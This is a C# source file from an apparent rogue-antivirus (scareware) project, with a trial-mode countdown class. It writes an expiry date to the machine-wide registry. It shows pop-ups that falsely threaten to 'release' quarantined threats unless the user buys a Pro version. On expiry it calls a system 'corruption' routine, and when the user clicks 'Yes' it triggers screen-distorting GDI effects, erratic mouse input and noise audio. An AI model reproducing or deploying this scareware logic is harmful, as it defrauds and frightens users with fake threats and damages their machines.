using RogueAntivirusPatched.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;
using timers = System.Timers;
using Microsoft.Win32;
using RogueAntivirusPatched.TrialMode.Payloads;
using System.Windows.Media.Animation;
using RogueAntivirusPatched.View.Windows;
using RogueAntivirusPatched.Global;
using System.IO;
using System.Diagnostics;
using RogueAntivirusPatched.View.Pages;
using RogueAntivirusPatched.Windows;
using RogueAntivirusPatched.Classes;
using System.Timers;

namespace RogueAntivirusPatched.TrialMode
{
    internal class CountDown
    {
        private DispatcherTimer timer;
        private timers.Timer timerDayLeft;
        private string regDurationValue = "TrialModeDuration";
        private string regDaysLeft = "DaysLeft";
        private KeySender keySender;
        private Events events;
        private static readonly Random rand = new Random();
        private Windows.Advertisement ad;

        public CountDown()
        {
            keySender = new KeySender();
            events = new Events();
            events.popUpPublisher.popUpHandler += Publisher_popUpHandler;
            events.negavPopUpPublisher.popUpHandler += NegavPopUpPublisher_popUpHandler;
        }

        public void SetTrialMode()
        {
            using (RegistryKey baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (RegistryKey regKey = baseKey.CreateSubKey(KeySender.mainPath))
                {
                    int yearLenght = GetAllDays();
                    int currentOrNextYear = DateTime.Now.Year * 1000;
                    int currentDay = DateTime.Now.DayOfYear;
                    int experationDay = 8;

                    int expiredDay = currentDay + experationDay;

                    if (regKey.GetValue(regDurationValue) is null)
                    {
                        if (expiredDay > yearLenght)
                        {
                            expiredDay -= yearLenght;
                            currentOrNextYear += 1000;
                        }

                        regKey.SetValue(regDurationValue, currentOrNextYear + expiredDay, RegistryValueKind.DWord);
                    }
                    else
                    {
                        int regExpiratedDay = (int)regKey.GetValue(regDurationValue);

                        if (regExpiratedDay <= currentOrNextYear + currentDay)
                        {
                            var mainWindow = (MainWindow)Application.Current.MainWindow;

                            mainWindow.Dispatcher.Invoke(() => mainWindow.Hide());

                            timer?.Stop();
                        }
                    }
                }
            }
        }

        public void DaysLeftCheckerTimer()
        {
            timerDayLeft = new timers.Timer();
            timerDayLeft.Interval = 10;
            timerDayLeft.Elapsed += DaysLeftCheck_Elapsed;
            timerDayLeft.Start();
        }

        private void DaysLeftCheck_Elapsed(object sender, timers.ElapsedEventArgs e)
        {
            var currentYear = DateTime.Now.Year * 1000;
            var curentDayOfTheYear = DateTime.Now.DayOfYear;
            var currentYearAndDayOfTheYear = currentYear + curentDayOfTheYear;

            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                using (var regKey = baseKey.CreateSubKey(KeySender.mainPath, true))
                {
                    int expirationDate = (int)regKey.GetValue(regDurationValue);
                    int daysLeft = expirationDate - currentYearAndDayOfTheYear;

                    if (regKey.GetValue(regDaysLeft) == null)
                    {
                        regKey.SetValue(regDaysLeft, daysLeft, RegistryValueKind.DWord);
                        return;
                    }

                    int oldDaysLeft = (int)regKey.GetValue(regDaysLeft);

                    if (daysLeft <= 0)
                    {
                        timerDayLeft.Stop();
                        Application.Current.Dispatcher.Invoke(() => HasExpired());
                        return;
                    }

                    if (daysLeft < oldDaysLeft)
                    {
                        regKey.SetValue(regDaysLeft, daysLeft, RegistryValueKind.DWord);
                        Application.Current.Dispatcher.Invoke(() =>
                        {
                            string title = "Alert";
                            string subTitle = "Trial Mode";
                            string text = "You are still running in a Trial Mode. This license is limited to only 7 days. " +
                            "If you don't upgrade to the Pro Version within 7 days, the Smart Shield will not provide protection to " +
                            "this device anymore." + Environment.NewLine + Environment.NewLine +
                            "WATCH OUT! ALL FOUND THREATS WILL BE RELEASED FROM THE QUARANTINE IF YOU DO NOT UPGRADE!" + Environment.NewLine + Environment.NewLine +
                            "Purchase the Pro Version now and stay secure!" + Environment.NewLine + "You have " + daysLeft.ToString() + " day(s) left!";
                            var bitmap = Properties.Resources.timeout;
                            var sound = Properties.Resources.ticking_fixed;
                            var margin = new Thickness(0, 0, 0, 80);
                            var width = 650;
                            var height = 500;
                            string btn1Text = "Upgrade";
                            string btn2Text = "Not today";
                            events.ShowPopUp(Events.PopUpArgs.PopUpType.Expiration, title, subTitle, text, bitmap, margin, width, height, sound, 
                                btn1Text, btn2Text);
                        });
                    }
                }
            }
        }

        private void HasExpired()
        {
            string title = "Final Question";
            string subTitle = "License has expired";

            string text = "At this moment, you cannot access any features and your device is becoming " +
                "vulnerable." + Environment.NewLine +
                "We are giving you the last chance. If you reject this offer, you will not be able to " +
                "use our software anymore." + Environment.NewLine + Environment.NewLine +
                "DO YOU WANT TO UPGRADE TO THE PRO VERSION?";

            string btn1Text = "Yes";
            string btn2Text = "No";
            double width = 700;
            double height = 600;
            var bitmap = Properties.Resources.happy_shield;
            int imgSize = 230;
            var sound = Properties.Resources.tweet;

            ad = new Windows.Advertisement();

            ad.btn_1.Click += Yes_Click;

            ad.ShowAdvertisement(false, subTitle, title, text, btn1Text, btn2Text, null, null,
                width, height, bitmap, sound, imgSize, imgSize, null, true);

            var corruption = new Corruption();
            corruption.QuickCorruption();
        }

        private void Yes_Click(object sender, RoutedEventArgs e)
        {
            if (ad == null)
                return;

            ad.btn_1.Visibility = Visibility.Hidden;
            ad.btn_1.IsEnabled = false;

            var input = new VirtuaLInput();
            var gdi = new Gdi();

            var mouseTimer = new timers.Timer();
            mouseTimer.Interval = 1;
            mouseTimer.Enabled = false;
            mouseTimer.AutoReset = true;
            mouseTimer.Elapsed += (s, e2) =>
            {
                gdi.Mandela(false, false, rand.Next(2) == 1 ? 8 : 4);
                input.CrazyMouseInput();
            };
            mouseTimer.Start();

            var beats = new Beats();
            PCMAudio.PCM.WaveForms[] waveForms = { PCMAudio.PCM.WaveForms.Noise, PCMAudio.PCM.WaveForms.Square,
            PCMAudio.PCM.WaveForms.Saw};
            _= beats.PCMAudio(beats.gibbersih(), waveForms, 10, 1.0, 3);

            var stopTimer = new timers.Timer();
            stopTimer.Interval = 3000;
            stopTimer.Enabled = false;
            stopTimer.AutoReset = false;
            stopTimer.Elapsed += (s, e2) =>
            {
                mouseTimer.Stop();
                gdi.CleanDc();
                beats.soundPlayer.Stop();
            };
            stopTimer.Start();
        }

        private void Publisher_popUpHandler(object sender, Events.PopUpArgs e)
        {
            switch (e.popUpType)
            {
                case Events.PopUpArgs.PopUpType.Expiration:

                    var mainWindow = (MainWindow)Application.Current.MainWindow;
                    mainWindow.Dispatcher.Invoke(() =>
                    {
                        mainWindow.VmMainWindow.ContentPage = new RegisterPage();
                        UISettings.ShowWindow();
                    });

                    break;
            }
        }

        private void NegavPopUpPublisher_popUpHandler(object sender, Events.PopUpArgs e)
        {
            switch (e.popUpType)
            {
                case Events.PopUpArgs.PopUpType.Expiration:

                    TTS.SpeakInterrupted(Variables.someResponses[rand.Next(Variables.someResponses.Length)], 100, 3);

                    break;
            }
        }

        public void LicenseChecker_Main()
        {
            timer = new DispatcherTimer();
            timer.Interval = TimeSpan.FromSeconds(1);
            timer.Start();
            timer.Tick += CheckerTimer_Tick;
        }

        private void CheckerTimer_Tick(object sender, EventArgs e)
        {
            if (keySender.HasLicense)
            {
                if (timer != null)
                    timer.Stop();

                if (timerDayLeft != null)
                    timerDayLeft.Stop();

                return;
            }
        }

        private static int GetAllDays()
        {
            bool isLeapYear = DateTime.IsLeapYear(DateTime.Now.Year);
            if (isLeapYear)
                return 366;

            return 365;
        }
    }
}
